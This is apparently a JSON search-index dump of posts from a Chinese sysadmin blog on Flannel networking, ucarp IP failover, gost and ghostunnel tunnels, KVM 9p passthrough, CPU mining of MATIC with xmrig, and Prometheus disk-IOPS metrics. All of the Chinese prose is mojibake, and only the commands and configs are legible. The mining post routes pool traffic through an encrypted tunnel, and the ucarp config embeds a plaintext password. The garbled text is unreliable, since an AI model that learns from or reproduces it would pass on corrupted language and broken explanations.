åˆ™åœ¨ä¸»æœºé—´å»ºç«‹éš§é“ï¼Œä¸åŒä¸»æœºçš„å®¹å™¨éƒ½åœ¨ä¸€ä¸ªå¤§çš„ç½‘æ®µå†…ï¼ˆæ¯”å¦‚ 10.2.0.0/16ï¼‰ã€‚ è™½ç„¶ vxlan ä¸ host-gw ä½¿ç”¨ä¸åŒçš„æœºåˆ¶å»ºç«‹ä¸»æœºä¹‹é—´è¿æ¥ï¼Œä½†å¯¹äºå®¹å™¨åˆ™æ— éœ€ä»»ä½•æ”¹å˜ã€‚ ç”±äº vxlan éœ€è¦å¯¹æ•°æ®è¿›è¡Œé¢å¤–æ‰“åŒ…å’Œæ‹†åŒ…ï¼Œæ€§èƒ½ä¼šç¨é€Šäº host-gwã€‚ ","date":"2022-03-17","img":"","permalink":"https://rendoumi.com/posts/20220317-kubernetes_flannel/","series":null,"tags":null,"title":"Kubernetesä¸‹Flannelç½‘ç»œ"},{"categories":null,"content":"æœ‰ V2EX çš„å›å‹é—®åˆ°å¦‚ä½•é™æ€ç¼–è¯‘ keepalived çš„é—®é¢˜ï¼Œå®é™…ä¸Š keepalived ç¡®å®é…ç½®æ¯”è¾ƒéº»çƒ¦ã€‚é‚£è¿˜æœ‰ä¸€ä¸ªç®€å•æ˜“è¡Œçš„ ucarpï¼Œç”Ÿäº§ä¹Ÿå¯ä»¥ç”¨è¿™ä¸ªã€‚\nucarp è·Ÿ keepalived ä¸€æ ·ï¼Œéƒ½æ˜¯ç”¨äºé«˜å¯ç”¨çš„ IP æ¼‚ç§»\nä½†æ˜¯æ¯” keepalived é…ç½®ç®€å•ï¼Œè€Œä¸” opnsense å°±æ˜¯ç”¨çš„è¿™ä¸ªåšçš„é«˜å¯ç”¨ï¼Œopnsense æ˜¯ä¸ªéå¸¸å¯é çš„é˜²ç«å¢™è½¯ä»¶ã€‚\né¦–å…ˆæœ‰ä¸¤å°è™šæœºï¼Œ172.18.19.1å’Œ172.18.19.2ï¼Œè™šæ‹Ÿipæ˜¯172.18.19.3\nå…ˆé…ç½®172.18.19.1\n1yum install epel-release 2yum install psmisc 3yum install ucarp 4 5cat\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /etc/systemd/system/ucarp.service 6[Unit] 7Description=UCARP virtual interface 8After=network.target 9 10[Service] 11Type=simple 12ExecStart=/usr/local/bin/ucarp.sh 13RemainAfterExit=true 14ExecStop=/usr/bin/killall -SIGTERM ucarp 15ExecStop=/bin/sleep 10 16TimeoutStopSec=30 17StandardOutput=journal 18 19[Install] 20WantedBy=multi-user.target 21EOF 22 23æ³¨æ„ï¼Œä¸Šé¢æˆ‘ä»¬çš„systemdæ˜¯ç›´æ¥è°ƒç”¨äº†ucarp.shæ¥å¯åŠ¨ï¼Œè¿™æ ·æ›´ç®€å•ã€‚ 24ä¸‰ä¸ªè„šæœ¬ï¼Œæ³¨æ„æƒé™æ˜¯755 25 26cat\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /usr/local/bin/ucarp.sh 27#!/bin/bash\u0026#39; 28/usr/sbin/ucarp -i eth0 -B -p nb1Dshiwode -v 001 -a 172.18.19.3 -s 172.18.19.1 --shutdown --preempt -u /usr/local/bin/vip-up.sh -d /usr/local/bin/vip-down.sh 29EOF 30 31cat\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /usr/local/bin/vip-up.sh 32#!/bin/sh 33/sbin/ip addr add ${2}/24 dev ${1} 34/sbin/ip neigh flush dev ${1} 35EOF 36 37cat\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /usr/local/bin/vip-down.sh 38#!/bin/sh 39/sbin/ip addr del ${2}/24 dev ${1} 40/usr/sbin/arp -d ${2} 41EOF 42 43chmod 755 /usr/local/bin/ucarp.sh /usr/local/bin/vip-up.sh /usr/local/bin/vip-down.sh okï¼Œç¬¬ä¸€å°æœºå™¨å°±é…ç½®å¥½äº†\næ‰€æœ‰çš„ä¸œè¥¿éƒ½åœ¨ucarp.shçš„é‚£ä¸€è¡Œçš„å‚æ•°ä¸Šï¼Œç›´æ¥ç”¨ucarp -hæ¥æŸ¥çœ‹\né…ç½®ç¬¬äºŒå°172.18.19.2ï¼Œå…¶ä»–çš„ä¸œè¥¿éƒ½ä¸€æ ·ï¼Œå”¯ä¸€ä¸åŒçš„å°±æ˜¯ucapr.shçš„ä¸€å¤„ä¸ä¸€æ ·\n1cat\u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /usr/local/bin/ucarp.sh 2#!/bin/bash\u0026#39; 3/usr/sbin/ucarp -i eth0 -B -p nb1Dshiwode -v 001 -a 172.18.19.3 -s 172.18.19.2 --shutdown --preempt -u /usr/local/bin/vip-up.sh -d /usr/local/bin/vip-down.sh 4EOF 5 6# -s 172.18.19.2 æºipå’Œ19.1ä¸åŒ okï¼Œä¸¤å°éƒ½é…ç½®å®Œæ¯•, åˆ†åˆ«æ‰§è¡Œå¯åŠ¨\n1systemctl daemon-reload 2systemctl enable --now ucarp å¯ä»¥å†æ‰¾ä¸€å°æœºå™¨ï¼Œä¸€ç›´é•¿ ping 172.18.19.3ï¼Œç„¶åéšæœºæ€æ‰ 19.1 å’Œ 19.2 ä¸Šé¢çš„ ucarp è¿›ç¨‹ï¼Œå¯ä»¥çœ‹åˆ° vip 172.18.19.3 ä¼šæ¥å›é£˜\næ³¨æ„ï¼šå¦‚æœä¸»æ‰äº†ï¼Œä»æ¥ç®¡äº† vip å˜æˆ masterï¼Œé‚£ä¹ˆä¸»å†èµ·æ¥çš„æ—¶å€™ä¸ä¼šå»æŠ¢ä»çš„ masterã€‚\n","date":"2022-02-25","img":"","permalink":"https://rendoumi.com/posts/20220225-ucarp/","series":null,"tags":null,"title":"Ucarpçš„å®‰è£…é…ç½®"},{"categories":null,"content":"ç”¨è¿‡äº†å¥½å‡ ä¸ª tunnel å·¥å…·è½¯ä»¶ï¼Œå„æœ‰é•¿å¤„ã€‚\nghostunnel æ˜¯æ”¯æŒè‡ªå®šä¹‰ tls è¯ä¹¦åŠ å¯†çš„ï¼Œè¿™å›ç”¨ä¸ªæ›´å‰å®³çš„ï¼Œæ”¯æŒå„ç§ä»£ç†é“¾æ¡çš„ï¼Œgost\né¡¹ç›®åœ°å€ï¼šhttps://github.com/ginuerzh/gost\né‡Œé¢çš„æ¦‚å¿µæœ‰ç‚¹æ„æ€ï¼Œå…¶å®å°±ä¸¤æ¡ï¼Œ-L æœ¬åœ°ç›‘å¬ï¼Œ-F é“¾æ¡è½¬å‘ã€‚\næ³¨æ„çš„å°±ä¸€ç‚¹ï¼Œ-F çš„æ—¶å€™å®é™…æ˜¯ä¸€ä¸ªä¸­è½¬æœåŠ¡å™¨ã€‚è¿™ä¸ªä¸­è½¬æœåŠ¡å™¨è¦è½¬å‘çš„è§„åˆ™éœ€è¦åœ¨ -L å‚æ•°é‡ŒæŒ‡å®šã€‚\né‚£ä¹ˆä¸¾ä¸ªå…·ä½“çš„ä¾‹å­ï¼š\nä¸­è½¬æœåŠ¡å™¨å¼€äº†ä¸€ä¸ªæ˜æ–‡ç«¯å£ 9999ï¼Œè¿™ä¸ªç«¯å£è·‘çš„æ˜¯ ghostunnel clientï¼ŒåŠ å¯†æ•°æ®åä¼ åˆ°å¦å¤–ä¸€ä¸ªghostunnel serveræœåŠ¡å™¨ï¼Œç„¶åæ•°æ®æ˜æ–‡ç©¿å‡ºï¼Œè®¿é—®å…·ä½“çš„ç›®çš„ç½‘ç«™çš„ç«¯å£ã€‚\nå®¢æˆ·ç«¯çš„æœåŠ¡å™¨å‘¢æ— å¤–ç½‘è®¿é—®æƒé™ï¼Œéœ€è¦è®¿é—®ä¸­è½¬æœåŠ¡å™¨ 192.168.1.1 çš„ 9999 ç«¯å£ï¼Œç„¶åæ•°æ®é€šè¿‡ ghostunnel åŠ å¯†ç©¿å‡ºåˆ°å¤–ç½‘ã€‚\nä¸­è½¬æœåŠ¡å™¨é…ç½®å¦‚ä¸‹ï¼š\n1# ghostunnel ç›‘å¬æœ¬åœ°ç¯å›åœ°å€çš„9999ç«¯å£ï¼ŒTLS åŠ å¯†ç©¿è¶Šåˆ°å¤–ç½‘110.114.5.19:9999ï¼Œç„¶åæ ¹æ®å¤–ç½‘ server é‡Œé¢çš„é…ç½®ï¼Œåˆ°è¾¾æœ€ç»ˆç›®çš„åœ° ip å’Œ ç«¯å£ 2ghostunnel client --listen localhost:9999 --target 110.114.5.19:9999 --keystore client.pem --cacert ca.pem --unsafe-listen 3 4# gost ç›‘å¬æœ¬åœ°ç½‘å¡192.168.1.1çš„9999ç«¯å£ 5gost-linux-amd64-2.11.1 -L=tls://192.168.1.1:9999 å®¢æˆ·ç«¯é…ç½®å¦‚ä¸‹ï¼š\n1gost-linux-amd64-2.11.1 -L=tcp://localhost:9999/localhost:9999 -F=tls://192.168.1.1:9999 è¿™æ ·å®¢æˆ·ç«¯çš„ç¨‹åºï¼Œåªè¦è¿æ¥ localhost:9999 çš„ tcp ç«¯å£ï¼Œå°±å¯ä»¥æ¥åŠ›ä¸­è½¬æœåŠ¡å™¨ç©¿å‡ºå»äº†ã€‚\nä¸Šé¢çš„é…ç½®éå¸¸æ€ªå¼‚å§ï¼Œä»”ç»†è§£é‡Šä¸€ä¸‹ï¼š\nä¸­è½¬æœåŠ¡å™¨å‘¢æœ‰ä¸¤ä¸ªåœ°å€ï¼Œlocalhostçš„ç¯å›åœ°å€ï¼Œä»¥åŠæœ¬åœ°ç½‘å¡192.168.1.1\nlocalhost:9999 æ˜¯ç”¨ ghostunnel åŠ å¯† tcp æµé‡ï¼Œtls ç©¿åˆ°å¤–ç½‘ 110.114.5.19 çš„ 9999 ç«¯å£ï¼Œç„¶åå¤–ç½‘å†è½¬å‘ã€‚\nä¸­è½¬æœåŠ¡å™¨åŒæ—¶ç›‘å¬äº†ä¸€ä¸ª 192.168.1.1:9999 ç«¯å£ tls çš„åŠ å¯†ä»£ç†ç«¯å£ã€‚\nä¸­è½¬æœåŠ¡å™¨çš„éƒ¨åˆ†å°±å®Œäº†ã€‚\nè€Œå®¢æˆ·ç«¯é…ç½® -L = tcp://localhost:9999/localhost:9999\nç¬¬ä¸€ä¸ª localhost:9999 æŒ‡çš„æ˜¯æœ¬æœºçš„åœ°å€ï¼Œç¬¬äºŒä¸ª localhost:9999 æŒ‡çš„æ˜¯ä¸­è½¬æœºä¸Šé¢çš„è½¬å‘åœ°å€ï¼Œè¿™ä¸ªåœ°æ–¹éå¸¸è®©äººè¿·æƒ‘ã€‚\nå¼ºè°ƒä¸€ä¸‹ï¼šä¸­è½¬ä»£ç†çš„è½¬å‘é…ç½®æ˜¯åœ¨å®¢æˆ·ç«¯è®¾ç½®ï¼Œè€Œä¸æ˜¯ä¸­è½¬ä»£ç†ä¸Šè®¾ç½®ã€‚ ç„¶å -F æŒ‡å®šäº†ä¸­è½¬æœåŠ¡å™¨ï¼Œå°±å¯ä»¥äº†ã€‚\næœ€åä¸€ä¸ªè¦æ³¨æ„çš„åœ°æ–¹ï¼Œä»£ç†åè®®æ— è®ºæ˜¯ tls ã€kcp ç­‰ï¼Œéƒ½è‡ªå¸¦ç¼ºçœçš„è¯ä¹¦ï¼Œå¦‚æœä¸æ»¡æ„ï¼Œå¯ä»¥è‡ªå·±æŒ‡å®šçš„ã€‚è¿™ä¸ªå·¥å…·ä¸ç”¨ç‰¹æ„ç”Ÿæˆè¯ä¹¦æ¥ä½¿ç”¨ã€‚\n","date":"2022-02-24","img":"","permalink":"https://rendoumi.com/posts/20220224-gost_tunnel/","series":null,"tags":null,"title":"Gost Tunnelçš„ä½¿ç”¨"},{"categories":null,"content":"è¿™ä¸ªéœ€æ±‚ä¹Ÿå¾ˆæœ‰ç‚¹æ„æ€ï¼ŒDBA è¦æ±‚åš MySQL çš„å¸è½½ä»åº“ï¼Œæ•°æ®é‡ä¼šå¾ˆå¤§ï¼Œç¡¬ç›˜ç©ºé—´åæœŸéœ€è¦æ‰©å®¹ï¼Œä½†æ˜¯ cpu åå€’å çš„ä¸å¤šã€‚\nå•ç‹¬ MySQL æ˜¯æ— æ³•é™åˆ¶å…¶ CPU æ ¸ä½¿ç”¨çš„ï¼Œè¿™æ ·çš„è¯ï¼Œæœ€å¥½å°±æ˜¯åšä¸ªè™šæœºæ¥æ§åˆ¶ MySQL æ€» CPU æ ¸æ•°çš„ä½¿ç”¨ï¼Œç„¶åç¡¬ç›˜æ‰©å®¹çš„è¯ï¼Œæ¯”å¦‚è¦æ‹‰ä¼¸è™šæœºçš„é™„åŠ ç¬¬äºŒå—ç¡¬ç›˜ï¼Œå¦‚æœæ˜¯ QEMU æ ¼å¼ï¼Œä¼šèŠ±è´¹å¾ˆé•¿æ—¶é—´ï¼Œæ‰€ä»¥å¹²è„†æŠŠå®¿ä¸»æœºçš„ç›®å½•ç›´æ¥é€ä¼ è¿›è™šæœºï¼Œä¹‹åå¦‚æœè¦æ‰©å®¹åŠ ç¡¬ç›˜ï¼Œç›´æ¥æŠŠæ–°çš„å¤§ç¡¬ç›˜ mount å‡ºæ¥å†é€è¿›å»å³å¯ï¼Œæ–°æ—§ç¡¬ç›˜æ‹·è´æ•°æ®ä¹Ÿæ¯”æ‹‰ä¼¸è™šæœºç¡¬ç›˜å¿«ã€‚\nCentOS7 ä¸‹çš„åšæ³•å¦‚ä¸‹ï¼š\nä¸¤ä¸ªå¤§å‰æï¼š\nä¸€ã€å®¿ä¸»æœºçš„ KVM qemu ç³»ç»Ÿéœ€è¦ä½¿ç”¨æ–°çš„ rpm åŒ…ï¼Œéœ€è¦ç¼–è¯‘\näºŒã€è™šæœºçš„å†…æ ¸éœ€è¦å‡çº§ï¼Œmount å‘½ä»¤éœ€è¦æ”¯æŒ -t p9 çš„æ–°æ ¼å¼\næˆ‘ä»¬åšå¥½å‡†å¤‡ï¼Œå°±å¯ä»¥å¼€å§‹äº†\nä¸€ã€ç¼–è¯‘å®¿ä¸»æœºçš„qemuæ–°åŒ… ç°åœ¨å·²ç»æ˜¯2022å¹´äº†ï¼Œæ‰€ä»¥ç¼–è¯‘çš„æ–¹å¼ä¹Ÿå‘ç”Ÿå˜åŒ–äº†ï¼Œæœ€ä½³ç¼–è¯‘æ–¹å¼æ˜¯å¹²è„†å¯åŠ¨ä¸€ä¸ª Docker è™šæ‹Ÿæœºï¼Œæ¥ç¼–è¯‘å‡ºæ¥ rpm åŒ…ï¼Œä¹Ÿä¸æ±¡æŸ“ç¯å¢ƒã€‚\né¦–å…ˆå…‹éš†ä¸‹æ¥é¡¹ç›®ï¼š\n1git clone https://github.com/AlekseyChudov/qemu-kvm-virtfs.git 2 3cd qemu-kvm-virtfs çœ‹ä¸€ä¸‹æœ€åçš„ build è„šæœ¬ï¼Œæœ‰ä¸€ä¸ªåœ°æ–¹éœ€è¦ä¿®æ”¹ï¼š\nç°åœ¨çš„ CentOS æœ€æ–°ç‰ˆæ˜¯ 7.9.2009 ï¼Œè¿™ä¸ªç‰ˆæœ¬æ ‘é‡Œæ˜¯æ²¡æœ‰ qemu çš„ Source Code çš„ï¼Œéœ€è¦ä¿®æ”¹ baseurlï¼Œé™ä½åˆ° 7.8.2003 æ‰æœ‰ Source çš„ repo\n1baseurl=https://mirrors.tripadvisor.com/centos-vault/centos/\\$releasever/virt/Source/kvm-common/ 2 3æ”¹æˆï¼š 4 5baseurl=https://mirrors.tripadvisor.com/centos-vault/centos/7.8.2003/virt/Source/kvm-common/ æ”¹å¥½å build è„šæœ¬å¦‚ä¸‹\n1#!/bin/bash 2 3set -ex 4 5yum -y update 6 7yum -y install \\ 8 \u0026#34;@Development Tools\u0026#34; \\ 9 centos-release-qemu-ev \\ 10 glusterfs-api-devel \\ 11 glusterfs-devel \\ 12 iasl \\ 13 kernel-devel \\ 14 libcacard-devel \\ 15 libepoxy-devel \\ 16 mesa-libgbm-devel \\ 17 nss-devel \\ 18 spice-protocol \\ 19 spice-server-devel \\ 20 usbredir-devel 21 22cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /etc/yum.repos.d/CentOS-QEMU-EV.repo 23[centos-qemu-ev-source] 24name=CentOS-\\$releasever - QEMU EV Sources 25baseurl=https://mirrors.tripadvisor.com/centos-vault/centos/7.8.2003/virt/Source/kvm-common/ 26gpgcheck=1 27enabled=0 28gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-SIG-Virtualization 29EOF 30 31yum-builddep -y qemu-kvm-ev 32 33yumdownloader --source qemu-kvm-ev 34 35rpm -Uvh qemu-kvm-ev-*.src.rpm 36 37sed -i \u0026#39;s/--disable-virtfs/--enable-virtfs/\u0026#39; /root/rpmbuild/SOURCES/build_configure.sh 38 39sed -i -e \u0026#39;/^%files -n qemu-kvm-common/,/^$/s/^$/%{_bindir}\\/virtfs-proxy-helper\\n%{_mandir}\\/man1\\/virtfs-proxy-helper.1.gz\\n/\u0026#39; \\ 40 -e \u0026#39;/^%if %{rhev}$/,/^%else$/s/pkgsuffix -ev/pkgsuffix -virtfs/\u0026#39; \\ 41 -e \u0026#39;/%define rhel_rhev_conflicts()/ a Provides: %1-ev = %{epoch}:%{version}-%{release} \\\\\\nObsoletes: %1-ev \u0026lt; %{obsoletes_version} \\\\\u0026#39; \\ 42 /root/rpmbuild/SPECS/qemu-kvm.spec 43 44rpmbuild -ba --clean /root/rpmbuild/SPECS/qemu-kvm.spec ç„¶åä¸€å¥è¯æ‰§è¡Œ Buildï¼š\n1cd qemu-kvm-virtfs 2 3docker run -it --privileged -v \u0026#34;$PWD/rpmbuild:/root/rpmbuild\u0026#34; \\ 4 docker.io/centos:7 /root/rpmbuild/build 5 6ä¼šå¾—åˆ°å¦‚ä¸‹çš„åŒ…ï¼Œç‰ˆæœ¬æ˜¯ 2.12.0-44.1.el7_8.1 ï¼š 7 8rpmbuild/RPMS/x86_64/qemu-img-virtfs-2.12.0-44.1.el7_8.1.x86_64.rpm 9rpmbuild/RPMS/x86_64/qemu-kvm-common-virtfs-2.12.0-44.1.el7_8.1.x86_64.rpm 10rpmbuild/RPMS/x86_64/qemu-kvm-tools-virtfs-2.12.0-44.1.el7_8.1.x86_64.rpm 11rpmbuild/RPMS/x86_64/qemu-kvm-virtfs-2.12.0-44.1.el7_8.1.x86_64.rpm 12rpmbuild/RPMS/x86_64/qemu-kvm-virtfs-debuginfo-2.12.0-44.1.el7_8.1.x86_64.rpm 13rpmbuild/SRPMS/qemu-kvm-virtfs-2.12.0-44.1.el7_8.1.src.rpm æˆ‘ä»¬åœ¨å®¿ä¸»æœºä¸Šå®‰è£…æ›¿æ¢æ–°çš„ qemu åŒ…ï¼Œå¹¶é‡å¯ libvirtd\n1yum -y install \\ 2 cloud-utils \\ 3 libvirt-client \\ 4 libvirt-daemon-config-network \\ 5 libvirt-daemon-config-nwfilter \\ 6 libvirt-daemon-driver-interface \\ 7 libvirt-daemon-driver-qemu \\ 8 virt-install \\ 9 rpmbuild/RPMS/x86_64/qemu-img-virtfs-2.12.0-44.1.el7_8.1.x86_64.rpm \\ 10 rpmbuild/RPMS/x86_64/qemu-kvm-common-virtfs-2.12.0-44.1.el7_8.1.x86_64.rpm \\ 11 rpmbuild/RPMS/x86_64/qemu-kvm-virtfs-2.12.0-44.1.el7_8.1.x86_64.rpm 12 13systemctl restart libvirtd è¿™æ ·å®¿ä¸»æœºå°±å‡†å¤‡å¥½äº†ã€‚\näºŒã€ç”Ÿäº§è™šæœºï¼Œåšå¥½passthrough ç”Ÿäº§è™šæœºçš„æ—¶å€™ï¼Œéœ€è¦åšå¥½å†…å¤–æ–‡ä»¶ç›®å½•çš„ç›´é€šï¼Œå®¿ä¸»æœºç›®å½•æ˜¯ /opt/testï¼Œå¯¹åº”è™šæœºç›®å½•æ˜¯ /test\n1\u0026lt;domains ...\u0026gt; 2 ... 3 \u0026lt;devices ...\u0026gt; 4 \u0026lt;filesystem type=\u0026#39;mount\u0026#39; accessmode=\u0026#39;passthrough\u0026#39;\u0026gt; 5 \u0026lt;source dir=\u0026#39;/opt/test\u0026#39;/\u0026gt; 6 \u0026lt;target dir=\u0026#39;/test\u0026#39;/\u0026gt; 7 \u0026lt;/filesystem\u0026gt; 8 \u0026lt;/devices\u0026gt; 9\u0026lt;/domains\u0026gt; è™šæœºå¯åŠ¨åï¼Œéœ€è¦å‡çº§æ ¸å¿ƒï¼Œæ”¯æŒæ–°çš„ mount é€‰é¡¹\n1yum -y update 2yum -y --enablerepo centosplus install kernel-plus 3reboot 4 5# æŠŠå®¿ä¸»æœºæä¾›çš„ /test ç‚¹ mount å‡ºæ¥ 6mount -t 9p -o trans=virtio,version=9p2000.L /test /opt/test ä¹Ÿå¯ä»¥æŠŠæŒ‚è½½ç‚¹å†™è¿›è™šæœºçš„ fstabï¼Œä¸‹æ¬¡å°±ä¼šè‡ªåŠ¨ mount äº†\n1/test /opt/test 9p trans=virtio,version=9p2000.L,nofail,_netdev,x-mount.mkdir 0 0 ","date":"2022-02-23","img":"","permalink":"https://rendoumi.com/posts/20220223-kvm_passthrouth/","series":null,"tags":null,"title":"KVMä¸‹å®¿ä¸»æœºçš„ç›®å½•ç›´é€šåˆ°è™šæœº"},{"categories":null,"content":"è¿™æ˜¯ä¸ªä¸¥è‚ƒè¯é¢˜ï¼Œæ­£ç»æŒ–ä»¥å¤ªå¸çš„è¯ï¼Œå¾ˆå¤šçš„çŸ¿å‚éƒ½æ˜¯å¦‚æœç›´æ¥æŒ–åˆ°ä»¥å¤ªå¸åœ°å€ï¼Œé‚£ä¹ˆå¿…é¡»æŒ–åˆ°å®Œæ•´ä¸€ä¸ªæ‰å…è®¸æç°ï¼Œæ‰‹ç»­è´¹è¿˜ç‰¹é«˜ã€‚\nä½†æ˜¯å¦‚æœæŒ–åˆ°ä»¥å¤ªé“¾Polygonçš„åœ°å€çš„è¯ï¼Œå°±å¯ä»¥ 0.005 ETHæå¸äº†ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º\nä½†æ˜¯åƒä¸‡è®°ä½ï¼ŒPolygonæå‡ºçš„æ‰€è°“ 0.005 ETHï¼Œçœ‹ä¸‹å›¾ï¼Œåªæ˜¯ä¸ªERC-20çš„Tokenï¼Œå®é™…æ˜¯wETH Tokenï¼Œå¿…é¡»ç»è¿‡è½¬æ¢æ‰èƒ½æåˆ° ETH å»ã€‚\nä» ERC-20 è½¬æ¢åˆ°å…¶å®ƒä»£å¸å‘¢ï¼Œéœ€è¦ MATIC ä»£å¸æ¥ä»˜è´¦ï¼Œè¿™ç©æ„ä¹Ÿå¿…é¡»å¾—æœ‰å•Šï¼åºŸè¯ä¸å¤šè¯´ï¼Œç›´æ¥æ”¾ä¸ŠæŒ–MATICæ•™ç¨‹ï¼Œæˆ‘çš„æœºå™¨æ˜¯ CentoOS\né¦–å…ˆéœ€è¦æœ‰ä¸ªå®Œå…¨è‡ªä¸»çš„çš„ ETH é’±åŒ…åœ°å€ï¼Œè¿™ä¸ªæˆ‘å°±ä¸æ•™å¤§å®¶äº†\nä¸€ã€ä¸‹è½½xmrigæŒ–çŸ¿è½¯ä»¶ ä¸‹è½½åœ°å€ï¼šhttps://github.com/xmrig/xmrig/releases\næˆ‘ä»¬é€‰æ‹©æœ€è¿‘çš„ä¸‹è½½å°±å¥½\näºŒã€åšå¥½åŠ å¯†é€šé“ æˆ‘ä»¬éœ€è¦åšå¥½ä¸€æ¡åŠ å¯†tcpé€šé“\nç”¨ ghostunnel, localhost:9012 \u0026mdash;\u0026gt; vps:9012 \u0026mdash;\u0026gt; rx.unmineable.com:3333\nä¸‰ã€ç”¨screenåå°å¼€æŒ– 1screen 2 3#./xmrig -o localhost:9999 -a rx -k -u DOGE:MATICåœ°å€.çŸ¿å·¥å 4./xmrig -o localhost:9012 -u MATIC:0x64358C7ddC96001697aBbA7ed431BADB6ABAaec5.cpu01 -p x --cpu-no-yield 5 6ctrl+a+d å››ã€æŸ¥çœ‹æŒ–äº†å¤šå°‘ æŸ¥çœ‹åœ°å€ï¼šhttps://unmineable.com/coins/MATIC/address/ äº”ã€å…‘æ¢ æŒ–åˆ°äº†è¶³å¤Ÿçš„ MATICï¼Œå°±å¯ä»¥æ„‰å¿«çš„å…‘æ¢äº†ã€‚\n","date":"2022-02-22","img":"","permalink":"https://rendoumi.com/posts/20220222-eth_matic/","series":null,"tags":null,"title":"å¦‚ä½•ç”¨CPUæŒ–Polygonç½‘ç»œçš„MATICå¸"},{"categories":null,"content":"å…¬å¸è¦åšé˜¿é‡Œçš„å°ç¨‹åºæ¥å…¥ï¼Œéœ€è¦é€šè¿‡æµ‹è¯•ï¼Œæµ‹è¯•å‘¢éœ€è¦æä¾›ç¡¬ç›˜çš„ç›‘æ§æŠ¥å‘Šï¼Œæ¯”å¦‚ iops ã€‚\nåŒäº‹ä»ç½‘ä¸Šæ‰¾äº†ä¸€ä¸‹ï¼Œiops ç›‘æ§åŸæ–‡å¦‚ä¸‹ï¼šç›‘æ§ç£ç›˜çš„ iops ï¼Œåˆ©ç”¨ linux çš„ /proc/diskstats çš„ç¬¬å››ä¸ªå­—æ®µå’Œç¬¬å…«å­—æ®µå¯ç›‘æ§è¯»å’Œå†™çš„ iopsï¼Œç¬¬å››ä¸ªè®°å½•æ˜¯è®°å½•æ‰€æœ‰è¯»çš„æ¬¡æ•°ï¼Œç¬¬å…«ä¸ªå­—æ®µæ˜¯è®°å½•æ‰€æœ‰å†™çš„æ¬¡æ•°ã€‚é€šè¿‡ zabbix ä¸Šçš„å·®é€Ÿç‡å³å¯ç›‘æ§ç£ç›˜çš„ iopsã€‚\næ–‡ç« é“¾æ¥ï¼šhttps://cloud.tencent.com/developer/article/1519113?ivk_sa=1024320u ä»”ç»†ç ”ç©¶äº†ä¸€ä¸‹ä¸Šé¢çš„æ–‡ç« ï¼Œçœ‹äº†å®ƒæä¾›äº†ä¸¤å¼ ç›‘æ§å›¾ï¼Œåˆ†æä¸€ä¸‹ï¼š\nç¬¬ä¸€å¼ å›¾ï¼š\næœ‰ä¸¤ä¸ªæŒ‡æ ‡ï¼Œç»¿è‰²çš„æ˜¯ç¡¬ç›˜æ¯ç§’çš„ io è¯»æ¬¡æ•°ï¼Œçº¢è‰²çš„æ˜¯ç¡¬ç›˜æ¯ç§’çš„ io å†™æ¬¡æ•°ã€‚\nç¬¬äºŒå¼ å›¾ï¼š\nåŒæ ·ä¸¤ä¸ªæŒ‡æ ‡ï¼Œç»¿è‰²çš„æ˜¯ç¡¬ç›˜æ¯ç§’çš„ io è¯» Bytesï¼Œçº¢è‰²çš„æ˜¯ç¡¬ç›˜æ¯ç§’çš„ io å†™ Bytesã€‚\nçŸ¥é“äº†æŒ‡æ ‡å…·ä½“çš„å«ä¹‰ï¼Œè¿™æ ·å°±å¥½åŠäº†ã€‚\næˆ‘ä»¬ç”¨çš„æ˜¯ prometheus å’Œ node_exporter\né¦–å…ˆå»çœ‹çœ‹ node_exporter æš´éœ²çš„æŒ‡æ ‡ï¼Œæœä¸€æœ node_diskï¼Œä¼šçœ‹åˆ°å¦‚ä¸‹4ä¸ªæŒ‡æ ‡ï¼š\n1# HELP node_disk_reads_completed_total The total number of reads completed successfully. 2# TYPE node_disk_reads_completed_total counter 3node_disk_reads_completed_total{device=\u0026#34;sda\u0026#34;} 4.9530358e+07 4# HELP node_disk_writes_completed_total The total number of writes completed successfully. 5# TYPE node_disk_writes_completed_total counter 6node_disk_writes_completed_total{device=\u0026#34;sda\u0026#34;} 1.4449267304e+10 7 8# HELP node_disk_read_bytes_total The total number of bytes read successfully. 9# TYPE node_disk_read_bytes_total counter 10node_disk_read_bytes_total{device=\u0026#34;sda\u0026#34;} 6.4101677568e+11 11# HELP node_disk_written_bytes_total The total number of bytes written successfully. 12# TYPE node_disk_written_bytes_total counter 13node_disk_written_bytes_total{device=\u0026#34;sda\u0026#34;} 1.15483858333184e+14 å¯ä»¥çœ‹å‡ºæ˜¯ä¸Šé¢ 4 ä¸ªæŒ‡æ ‡ï¼Œè¿™å››ä¸ªæŒ‡æ ‡éƒ½æ˜¯ counter è®¡æ•°å™¨ç±»å‹çš„ï¼Œéƒ½æ˜¯åªå¢ä¸å‡çš„ã€‚\nç„¶åå» prometheus ï¼Œç”»ä¸ªå›¾è¯•è¯•ï¼Œquery åˆ†åˆ«å¦‚ä¸‹ï¼ˆæ³¨æ„æˆ‘ä»¬çš„ instance å³ node_exporterï¼Œæ˜¯è·‘åœ¨äº† 50000 ç«¯å£ï¼Œæ˜¯éæ ‡å‡†çš„ï¼‰ï¼š\n1node_disk_reads_completed_total{instance=\u0026#34;192.168.1.1:50000\u0026#34;} 2node_disk_writes_completed_total{instance=\u0026#34;192.168.1.1:50000\u0026#34;} 3 4node_disk_read_bytes_total{instance=\u0026#34;192.168.1.1:50000\u0026#34;} 5node_disk_written_bytes_total{instance=\u0026#34;192.18.1.1:50000\u0026#34;} å¤§å®¶çœ‹åˆ°äº† counter ç±»å‹ï¼Œå¿…ç„¶æ˜¯ä¸€æ¡æ–œçº¿ç›´å†²å¤©é™…ã€‚\nå¥½äº†ï¼Œæˆ‘ä»¬ç„¶åå» grafana é‡Œå¢åŠ é¢æ¿ï¼š\né€‰ Add Query\nå…ˆé€‰æ•°æ®æºï¼Œé€‰æ‹©ç³»ç»Ÿä¸­å·²ç»é…å¥½çš„ prometheusï¼Œæ€ä¹ˆé…è¿™é‡Œå°±ä¸è¯´äº†ï¼š\nç„¶ååœ¨ Query çš„ Metrics é‡Œå¡«å…¥ node_disk_written_bytes_total{instance=\u0026quot;192.168.1.1:50000\u0026quot;}ï¼š\nåœ¨ Legend 